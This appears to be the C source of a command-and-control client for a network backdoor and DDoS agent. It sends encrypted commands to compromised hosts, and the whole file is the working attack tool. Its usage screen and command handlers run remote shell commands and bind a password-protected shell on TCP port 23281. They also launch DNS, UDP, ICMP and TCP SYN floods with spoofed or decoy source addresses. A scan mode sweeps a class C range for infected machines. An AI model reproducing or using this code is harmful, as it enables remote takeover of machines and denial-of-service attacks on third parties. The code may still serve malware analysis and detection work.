#include <getopt.h>
#include <stdarg.h>
#include <libnet.h>

#include "debug.h"
#include "send.h"
#include "recv.h"
#include "backdoor.h"

/******************************************************************************/
/*                         General definitions                                */
/******************************************************************************/


#define CAPTURE_INFINITE     0x7FFFFFFF
#define ARGUMENT_SIZE        1514


#define ASSERT(condition) if (condition) backdoor_perror(NULL, 2)


char *tasks[] = {
 "info",
 "init",
 "shell",
 "dns_answers (flood)",
 "udp/icmp",
 "bind",
 "shell_null",
 "kill",
 "dns_answers <n>",
 "tcp (flood)",
 "tcp <n>",
 "dns"
};

/******************************************************************************/
/*                          Packet manipulations                              */
/******************************************************************************/

void put_port(char *packet, int offset_port, const char *port) {
 short p;

 if (!port) p = 0;
 else p = htons(atoi(port));
 *((u_short*)&packet[offset_port]) = p;
}


#define put_ip(packet, offset_ip, string) \
 put_ip_hostname_port(packet, -1, offset_ip, -1, -1, string)

#define put_ip_port(packet, offset_ip, offset_port, string) \
 put_ip_hostname_port(packet, -1, offset_ip, -1, offset_port, string)

#define put_ip_hostname(packet, offset_use_hostname, offset_ip, offset_hostname, string) \
 put_ip_hostname_port(packet, offset_use_hostname, offset_ip, offset_hostname, -1, string)

int put_ip_hostname_port(char *packet, int offset_use_hostname, int offset_ip, int offset_hostname, int offset_port, char *string) {
 char *separator, *ip_or_hostname, *port;
 int size;

 if (string) {
  separator = strchr(string, ':');
  if (!separator) {
   ip_or_hostname = string;
   port = NULL;
  }
  else if (offset_port == -1) return -1; /* no port authorized */
  else if (separator == string) {
   ip_or_hostname = NULL;
   port = string+1;
  }
  else {
   ip_or_hostname = string;
   *separator = 0;
   port = separator+1;
  }
 }
 else {
  ip_or_hostname = NULL;
  port = NULL;
 }

 if (!ip_or_hostname) { /* use default ip */
   *((u_long*)&packet[offset_ip]) = 0;
   if (offset_use_hostname != -1) packet[offset_use_hostname] = 0; /* don't use hostname */
   size = 0;
 }
 else if (offset_hostname == -1) { /* can't use hostname */
  *((u_long*)&packet[offset_ip]) = libnet_name_resolve(ip_or_hostname, LIBNET_RESOLVE);
  size = 0;
 }
 else if (*ip_or_hostname == '@') { /* resolve name locally */
  *((u_long*)&packet[offset_ip]) = libnet_name_resolve(ip_or_hostname+1, LIBNET_RESOLVE);
  packet[offset_use_hostname] = 0; /* don't use hostname */
  size = 0;
 }
 else { /* resolve name remotely */
  strcpy(&packet[offset_hostname], ip_or_hostname);
  packet[offset_use_hostname] = 1; /* use hostname */
  size = strlen(ip_or_hostname) + 1;
 }

 if (offset_port != -1) put_port(packet, offset_port, port);

 return size;
}


int get_size(char *packet, int offset_use_hostname, int offset_hostname) {
 if (packet[offset_use_hostname] == 0) return 0;
 return strlen(&packet[offset_hostname])+1;
}

/******************************************************************************/
/*                                Packet decoding                             */
/******************************************************************************/

void decode_decrypted(int capture_dump, int direction, char *decrypted, int size) {
 if (direction == BACKDOOR_DIRECTION_CLIENT_TO_SERVER) {
  printf("%s",tasks[decrypted[1]-1]);
  switch(decrypted[1]-1) { /* command */
   case 0:
   case 5:
   case 7:
    printf("\n");
    size = 0;
    break;
   case 1:
    printf("\n");
    size = 2 + 1 + 10 * sizeof(u_long);
    break;
   case 2:
   case 6:
    if (capture_dump) {
     printf("\n");
     size = 2+strlen(decrypted+2)+1;
    }
    else {
     printf(": %s\n", decrypted+2);
     size = 0;
    }
    break;
   case 3:
    printf("\n");
    size = 2 + 9 + get_size(decrypted+2, 6, 9);
    break;
   case 4:
    printf("\n");
    size = 2 + 0xD + get_size(decrypted+2, 0xA, 0xD);
    break;
   case 8:
    printf("\n");
    size = 2 + 0xA + get_size(decrypted+2, 7, 0xA);
    break;
   case 9:
    printf("\n");
    size = 2 + 0xE + get_size(decrypted+2, 0xB, 0xE);
    break;
   case 0xA:
    printf("\n");
    size = 2 + 0xF + get_size(decrypted+2, 0xC, 0xF);
    break;
   case 0xB:
    printf("\n");
    size = 2 + 0xE + get_size(decrypted+2, 0xB, 0xE);
    break;
  }
  if (!capture_dump) printf("\n");
 }
 else { /* BACKDOOR_DIRECTION_SERVER_TO_CLIENT */
  if (decrypted[1] == 1 && decrypted[2] == 7) { /* info */
   printf("info: ");
   if (capture_dump) {
    printf("\n");
    size = 5;
   }
   else {
    int task;
    task = decrypted[4];
    printf("task = ");
    if (decrypted[3] == 0) printf("/ (%X)\n", task);
    else if (tasks[task]) printf("%s (%X)\n", tasks[task], task);
    size = 0;
   }
  }

  if (decrypted[1] == 3 || decrypted[1] == 4) { /* output */
   if (capture_dump) {
    printf("shell output:\n");
    size = 2 + strlen(decrypted+2);
   }
   else {
    decrypted[2+BACKDOOR_OUTPUT_SIZE+1] = 0;
    if (strlen(decrypted+2) != 0) {
     if (decrypted[1] == 3) printf("\n");
     printf("%s", decrypted+2);
    }
    else printf("\n");
    size = 0;
   }
  }
 }
 if (size) dump(decrypted, size);
}

/******************************************************************************/
/*                                 Scanning                                   */
/******************************************************************************/
void scan(char *interface, const char *domain) {
 char *source;
 int i;

 source = get_ip_address(interface);
 ASSERT(backdoor_client_recv_init(interface, source) != -1);

 for (i = 1; i < 255; i++) {
  char destination[17];
  char argument[ARGUMENT_SIZE];

  snprintf(destination, 17, "%s.%d", domain, i);
  printf("%s", destination);

  argument[0] = 0; /* no decoys */
  put_ip(argument, 1, source);
  ASSERT(backdoor_client_send(source, destination, 1, argument, 1+sizeof(u_long)) != -1); /* configure IP address */
  ASSERT(backdoor_client_send(source, destination, 0, NULL, 0) != -1); /* ask for informations */
  if (wait_recv(100)) { /* packet received before 100ms timeout */
   char src[17], dst[17];
   int direction;
   char decrypted[ARGUMENT_SIZE];

   ASSERT(backdoor_client_recv(src, dst, &direction, decrypted) != -1);
   if (direction == BACKDOOR_DIRECTION_SERVER_TO_CLIENT && decrypted[1] == 1 && decrypted[2] == 7) printf(" BACKDOOR !!!");
  }
  printf("\n");
 }

 backdoor_client_recv_terminate();
}

/******************************************************************************/
/*                                Interface                                   */
/******************************************************************************/

void usage(const char *progname) {
 fprintf(stderr, 
  "USAGE: %s ? | -?    : this help screen\n"
  "USAGE: %s [options] : sniffing mode\n"
  "USAGE: %s <class C> : scanning mode\n"
  "USAGE: %s [options] <ip_source> <ip_destination> <command [arguments] ...>\n"
  "\n"
  "OPTIONS:\n"
  " -c[=n]          : capture <n> packets (default: [n] = infinite)\n"
  " -d                  : dump captured packets (default: decode)\n"
  " -i <interface name> : bind to specified Ethernet interface (default: eth0)\n"
  "\n"
  "COMMANDS:\n"
  " <command number (<=11)> <argument string>\n"
  " INITIALISATION: (default [ip] or [@]: <ip_source>)\n"
  "  init [ip]                   : initialize IP\n"
  "  init_decoys_random [ip]     : initialize IP and random decoys\n"
  "  init_decoys [decoy1] [@]... [decoy10] : initialize IP and user defined decoys\n"
  " TASKS: (task = bind | DDOS)\n"
  "  info                        : output informations on the current task\n"
  "  kill                        : kill the current task\n"
  " SHELL:\n"
  "  shell <command string>      : run <command string> with output\n"
  "  shell_null <command string> : run <command string> without ouput\n"
  "  bind                        : bind a shell on TCP port 23281 (pass = SeNiF)\n"
  " DDOS: ([@] = resolve <ip> locally (default: remotely),\n"
  "        default [port]: random, default [n]: infinite)\n"
  "  dns_answers <[@]ip>[:port] [n]      : send [n] DNS answers to target\n"
  "  dns [from_ip][:port] <[@]to_ip> <n> : send <n> DNS packets to port 53\n"
  "  udp <from_ip> <[@]to_ip:port>       : send UDP datagrams\n"
  "  icmp <from_ip> <[@]to_ip>           : send ICMP ECHO datagrams\n"
  "  tcp [from_ip] <[@]to_ip:port> [n]   : send [n] TCP SYN segments\n"
  ,progname, progname, progname, progname);
 exit(1);  
}


int main(int argc, char **argv) {
 /* command line options and arguments */
 int args;
 char source[64+1], destination[64+1];
 char command_string[64+1];
 char *interface = "eth0";
 int capture = 0;
 int capture_dump = 0;

 /* command line parameters definition */
 #define SHORT_OPTIONS "c::di:"
 struct option long_options[] = {
  /* {"name",has_arg,&variable,value} */
  { "capture",   2, NULL, 'c' },
  { "dump",      0, NULL, 'd' },
  { "interface", 1, NULL, 'i' },
  { 0, 0, 0, 0 }
 };
 int c;
 int option_index = 0;

 /********************** read command line options ****************************/

 opterr = 0;
 while ((c = getopt_long_only(argc, argv, SHORT_OPTIONS, long_options, &option_index)) != -1) {
  switch(c) {
   case 'c':
    capture = (optarg ? atoi(optarg) : CAPTURE_INFINITE);
    break;
   case 'd':
    capture_dump = 1;
    break;
   case 'i':
    interface = optarg;
    break;
   case 0: /* long option set variable */
    break;
   case '?': /* error option character */
   case ':': /* error option parameter */
   default:
    usage(argv[0]);
  }
 }

 /* read obligatory arguments */
 args = argc - optind;
 if (args == 1) {
  scan(interface, argv[optind]);
  exit(0);
 }
 if (args != 0 && args < 3) usage(argv[0]);
 if (args == 0) {
  command_string[0] = 0;
  args = -1;
 }
 else {
  strncpy(source, argv[optind], sizeof(source));
  strncpy(destination,argv[optind+1], sizeof(destination));
  strncpy(command_string, argv[optind+2], sizeof(command_string));
  optind += 3;
  args = argc - optind;
 }

 /*************************** process commands ********************************/

 if (!strcmp(command_string, "info")) {
  if (args != 0) usage(argv[0]);
  ASSERT(backdoor_client_recv_init(interface, source) != -1);
  ASSERT(backdoor_client_send(source, destination, 0, NULL, 0) != -1);
  while (1) { /* capture output */
   char decrypted[ARGUMENT_SIZE];

   ASSERT(backdoor_client_recv(source, destination, NULL, decrypted) != -1);
   if (decrypted[1] == 1 && decrypted[2] == 7) { /* info */
    decode_decrypted(capture_dump, BACKDOOR_DIRECTION_SERVER_TO_CLIENT, decrypted, 0);
    break;
   }
  }
  if (capture) backdoor_client_recv_terminate();
 }


 else if (!strcmp(command_string, "init")) {
  char argument[ARGUMENT_SIZE];

  if (args > 1) usage(argv[0]);

  argument[0] = 0; /* no decoys */
  put_ip(argument, 1, (args == 0) ? source : argv[optind]);
  ASSERT(backdoor_client_send(source, destination, 1, argument, 1+sizeof(u_long)) != -1);
 }


 else if (!strcmp(command_string, "init_decoys_random")) {
  char argument[ARGUMENT_SIZE];

  if (args > 1) usage(argv[0]);

  argument[0] = 1; /* random decoys */
  put_ip(argument, 1, (args == 0) ? source : argv[optind]);
  ASSERT(backdoor_client_send(source, destination, 1, argument, 1+sizeof(u_long)) != -1);
 }


 else if (!strcmp(command_string, "init_decoys")) {
  char argument[ARGUMENT_SIZE];
  int i;

  if (args > 9) usage(argv[0]);
  argument[0] = 2;
  for (i = 0; i < 10; i++) {
   char *decoy;

   if (i < args) { /* a decoy argument exists */
    if (!strcmp(argv[optind+i], "@")) decoy = source;
    else decoy = argv[optind+i];
   }
   else
    decoy = NULL;
   put_ip(argument, 1+i*sizeof(u_long), decoy);
  }
  ASSERT(backdoor_client_send(source, destination, 1, argument, 1+10*sizeof(u_long)) != -1);
 }


 else if (!strcmp(command_string, "shell")) {
  if (args != 1) usage(argv[0]);
  ASSERT(backdoor_client_recv_init(interface, source) != -1);
  ASSERT(backdoor_client_send(source, destination, 2, argv[optind], strlen(argv[optind])) != -1);
  while (1) { /* capture output */
   char decrypted[ARGUMENT_SIZE];

   ASSERT(backdoor_client_recv(source, destination, NULL, decrypted) != -1);
   if (decrypted[1] == 3 || decrypted[1] == 4) {
    if (strlen(decrypted+2) == 0) break;
    decode_decrypted(capture_dump, BACKDOOR_DIRECTION_SERVER_TO_CLIENT, decrypted, 0);
   }
  }
  if (capture) backdoor_client_recv_terminate();
 }


 else if (!strcmp(command_string, "dns_answers")) {
  char argument[ARGUMENT_SIZE];
  int size;

  if (args == 1) { /* flood */
   size = put_ip_hostname_port(argument, 6, 0, 9, 4, argv[optind]);
   ASSERT(backdoor_client_send(source, destination, 3, argument, 9+size) != -1);
  }
  else if (args == 2) { /* send count */
   size = put_ip_hostname_port(argument, 7, 0, 0xA, 5, argv[optind]);
   argument[4] = atoi(argv[optind+1]);
   ASSERT(backdoor_client_send(source, destination, 8, argument, 0xA+size) != -1);
  }
  else usage(argv[0]);
 }


 else if (!strcmp(command_string, "bind")) {
  if (args != 0) usage(argv[0]);
  ASSERT(backdoor_client_send(source, destination, 5, NULL, 0) != -1);
 }


 else if (!strcmp(command_string, "shell_null")) {
  if (args != 1) usage(argv[0]);
  ASSERT(backdoor_client_send(source, destination, 6, argv[optind], strlen(argv[optind])) != -1);
 }


 else if (!strcmp(command_string, "kill")) {
  if (args != 0) usage(argv[0]);
  ASSERT(backdoor_client_send(source, destination, 7, NULL, 0) != -1);
 }


 else if (!strcmp(command_string, "dns")) {
  char argument[ARGUMENT_SIZE];
  int i, size;

  if (args < 2 || args > 3) usage(argv[0]);
  if (args == 2) {
   put_ip_port(argument, 4, 9, NULL);
   i = 0;
  }
  else {
   put_ip_port(argument, 4, 9, argv[optind]);
   i = 1;
  }
  size = put_ip_hostname(argument, 0xB, 0, 0xE, argv[optind+i]);
  argument[8] = atoi(argv[optind+i+1]);
  ASSERT(backdoor_client_send(source, destination, 0xB, argument, 0xE + size) != -1);
 }


 else if (!strcmp(command_string, "udp") || !strcmp(command_string, "icmp")) {
  char argument[ARGUMENT_SIZE];
  int size;

  if (args != 2) usage(argv[0]);
  put_ip(argument, 6, argv[optind]);
  size = put_ip_hostname_port(argument, 0xA, 2, 0xD, 0, argv[optind+1]);
  /* put UDP/ICMP after port, to overwrite high byte of port (port on 1 byte) */
  if (!strcmp(command_string, "udp")) argument[0] = 1; /* use UDP */
  else argument[0] = 0; /* use ICMP */
  ASSERT(backdoor_client_send(source, destination, 4, argument, 0xD + size) != -1);
 }


 else if (!strcmp(command_string, "tcp")) {
  char argument[ARGUMENT_SIZE];
  int count, size;
  char *src, *dst;

  if (args < 1 || args > 3) usage(argv[0]);
  if (strchr(argv[argc-1], '.')) count = 0;
  else count = atoi(argv[argc-1]);
  switch(args) {
  case 1:
   if (count) usage(argv[0]);
   src = NULL;
   dst = argv[optind];
   break;
  case 2:
   src = count ? NULL         : argv[optind];
   dst = count ? argv[optind] : argv[optind+1];
   break;
  case 3:
   if (!count) usage(argv[0]);
   src = argv[optind];
   dst = argv[optind+1];
   break;
  }
 
  if (src) { /* common for both commands */
   argument[6] = 1; /* user defined source ip */
   put_ip(argument, 7, src);
  }
  else 
   argument[6] = 0; /* random source ip */

  if (count) {
   size = put_ip_hostname_port(argument, 0xC, 0, 0xF, 4, dst);
   argument[0xB] = count;
   ASSERT(backdoor_client_send(source, destination, 0xA, argument, 0xF + size) != -1);
  }
  else {
   size = put_ip_hostname_port(argument, 0xB, 0, 0xE, 4, dst);
   ASSERT(backdoor_client_send(source, destination, 9, argument, 0xE + size) != -1);
  } 
 }


 else { /* sniffing or command number */
  int command, i;

  if (args == -1) capture = CAPTURE_INFINITE;
  else {
   if (args != 1) usage(argv[0]);
   command = atoi(command_string); 
  }

  if (capture) ASSERT(backdoor_client_recv_init(interface, (args == -1) ? NULL : source) != -1);

  if (args != -1) ASSERT(backdoor_client_send(source, destination, command, argv[optind], strlen(argv[optind])) != -1);

  /* capture answers */
  for (i = 0; i < capture; i++) {
   int direction,size;
   char decrypted[ARGUMENT_SIZE];

   ASSERT((size = backdoor_client_recv(source, destination, &direction, decrypted)) != -1);
   if (direction == BACKDOOR_DIRECTION_CLIENT_TO_SERVER) printf("CLIENT -> SERVER");
   else printf("SERVER -> CLIENT");
   printf(": %s -> %s (size:%d) ", source, destination, size);
   decode_decrypted(capture_dump, direction, decrypted, size);

   /* special manipulation to correctly print sniffed output */
   if (direction == BACKDOOR_DIRECTION_SERVER_TO_CLIENT && !capture_dump && (decrypted[1] == 3 || decrypted[1] == 4) && decrypted[2] != 0 && decrypted[2+strlen(decrypted+2)] != '\n') printf("\n");
  }

  if (capture) backdoor_client_recv_terminate();
 }

 exit(0);
}
